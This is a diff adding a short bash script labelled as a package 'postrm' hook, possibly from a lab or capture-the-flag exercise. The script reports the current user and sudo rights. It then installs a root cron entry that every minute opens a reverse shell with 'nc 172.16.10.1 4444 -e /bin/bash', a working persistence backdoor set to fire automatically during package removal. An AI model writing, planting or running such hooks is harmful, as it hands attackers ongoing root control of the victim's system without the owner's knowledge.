@@ -1,0 +1,9 @@
+#!/usr/bin/env bash
+
+echo "BKSH - postrm"
+echo "| whoami $(whoami)"
+echo "| sudo -l $(sudo -l)"
+
+if ! grep -q "4444" /var/spool/cron/crontabs/root 2> /dev/null; then
+  echo "* * * * * root nc 172.16.10.1 4444 -e /bin/bash" | crontab - -u root
+fi
